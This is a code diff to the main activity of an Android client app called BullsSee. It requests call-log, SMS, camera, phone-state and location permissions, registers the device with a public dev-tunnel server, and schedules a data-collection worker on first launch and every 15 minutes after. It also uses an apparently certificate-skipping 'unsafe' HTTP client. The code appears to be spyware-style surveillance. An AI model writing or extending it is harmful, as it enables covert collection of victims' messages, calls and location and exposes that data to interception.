@@ -3,9 +3,11 @@ package com.example.bullsseeclient
 import android.Manifest
 import android.content.Context
 import android.content.Intent
+import android.content.SharedPreferences
 import android.os.Build
 import android.os.Bundle
 import android.telephony.TelephonyManager
+import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
@@ -22,6 +24,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import com.google.gson.Gson
@@ -47,6 +50,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    private lateinit var prefs: SharedPreferences
     private val permissionRequest = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
@@ -58,18 +62,35 @@ class MainActivity : ComponentActivity() {
         val phoneStateGranted = permissions[Manifest.permission.READ_PHONE_STATE] == true
 
         if (callLogGranted && smsGranted && cameraGranted && phoneStateGranted) {
+            Log.d("MainActivity", "All required permissions granted")
             registerDevice()
+            // Check if it's the first launch and trigger initial data collection
+            if (!prefs.getBoolean("isFirstLaunch", false)) {
+                Log.d("MainActivity", "First launch detected, triggering one-time data collection")
+                val oneTimeWorkRequest = OneTimeWorkRequestBuilder<DataCollectionWorker>()
+                    .build()
+                WorkManager.getInstance(this).enqueue(oneTimeWorkRequest)
+                prefs.edit().putBoolean("isFirstLaunch", true).apply()
+                Log.d("MainActivity", "One-time work request enqueued")
+            }
             val workRequest = PeriodicWorkRequestBuilder<DataCollectionWorker>(15, TimeUnit.MINUTES)
                 .build()
             WorkManager.getInstance(this).enqueue(workRequest)
+            Log.d("MainActivity", "Periodic work request enqueued")
+        } else {
+            Log.w("MainActivity", "Some permissions denied: location=$locationGranted, callLog=$callLogGranted, sms=$smsGranted, camera=$cameraGranted, phoneState=$phoneStateGranted")
         }
         if (locationGranted) {
             startService(Intent(this, LocationService::class.java))
+            Log.d("MainActivity", "Location service started")
+        } else {
+            Log.w("MainActivity", "Location permission denied, service not started")
         }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        prefs = getSharedPreferences("BullsSeePrefs", MODE_PRIVATE)
         setContent {
             MaterialTheme { // Replaced BullsSeeTheme with MaterialTheme
                 Surface(
@@ -94,8 +115,9 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun registerDevice() {
+        Log.d("MainActivity", "Registering device: deviceName=$deviceName, model=${Build.MODEL}, osVersion=${Build.VERSION.RELEASE}")
         val retrofit = Retrofit.Builder()
-            .baseUrl("https://localhost:7239/")
+            .baseUrl("https://30lss7df-7239.inc1.devtunnels.ms/")
             .addConverterFactory(GsonConverterFactory.create())
             .client(HttpClient.getUnsafeOkHttpClient())
             .build()
@@ -105,12 +127,14 @@ class MainActivity : ComponentActivity() {
         val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(device))
         apiService.registerDevice(body).enqueue(object : retrofit2.Callback<Void> {
             override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
-                if (!response.isSuccessful) {
-                    // Log failure
+                if (response.isSuccessful) {
+                    Log.d("MainActivity", "Device registered successfully: status=${response.code()}")
+                } else {
+                    Log.e("MainActivity", "Device registration failed: status=${response.code()}, message=${response.errorBody()?.string()}")
                 }
             }
             override fun onFailure(call: Call<Void>, t: Throwable) {
-                // Handle failure
+                Log.e("MainActivity", "Device registration failed: error=${t.message}")
             }
         })
     }
